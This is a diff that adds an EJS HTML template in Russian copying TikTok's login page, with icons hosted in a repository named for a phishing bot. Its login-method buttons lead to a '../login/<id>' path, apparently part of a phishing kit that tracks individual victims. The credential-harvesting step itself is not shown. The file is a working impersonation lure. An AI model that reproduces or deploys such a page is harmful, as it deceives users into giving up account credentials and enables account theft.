@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../tt_style.css">
+    <meta property="og:url" content="<%= global.url %>/tiktok">
+    <meta name="description" content="TikTok">
+    <meta property="og:image" content="https://github.com/DarkNetFox/images-vk-fishing-bot/blob/main/tt_icon_6.png?raw=true">
+    <title>Вход | TikTok</title>
+</head>
+<body>
+    <div class="main_block">
+        <header class="tiktok-web-header-13pzv no-title-2H3Hq">
+            <div class="login_test_2">
+                <a href="https://www.tiktok.com/feedback/?lang=ru-RU" target="_blank" class="login_test">
+                    <img class="icon_login" src="https://github.com/DarkNetFox/images-vk-fishing-bot/blob/main/tt_icon_5.png?raw=true" alt="">
+                    <span>Обратная связь и помощь</span>
+                </a>
+            </div>
+        </header>
+        <div class="main_block_2">
+            <div class="name">
+                <b>Войти в TikTok</b>
+            </div>
+            <div class="about">Управляйте аккаунтом, проверяйте уведомления, комментируйте видео и получите другие возможности.</div>
+
+              <% buttons.forEach(function(data) { %>
+          
+                <% if(data.active.status == "true") { %>
+                  <a href="../login/<%= id %>">
+                <% } %>
+
+                <div class="buttons">
+                  <div class="icon_div">
+                    <img class="<%= data.css %>" src="<%= data.icon %>" alt="">
+                  </div>
+                  <div class="buttons_text">
+                    <%= data.name %>
+                  </div>
+                </div>
+                    
+                <% if(data.active.status == "true") { %>
+                  </a>
+                <% } %>
+
+              <% }); %>
+        <div class="login">Еще нет аккаунта?<a class="link-2j8GS" href="https://www.tiktok.com/signup"> Регистрация</a></div>
+    </div>
+</body>
+</html>
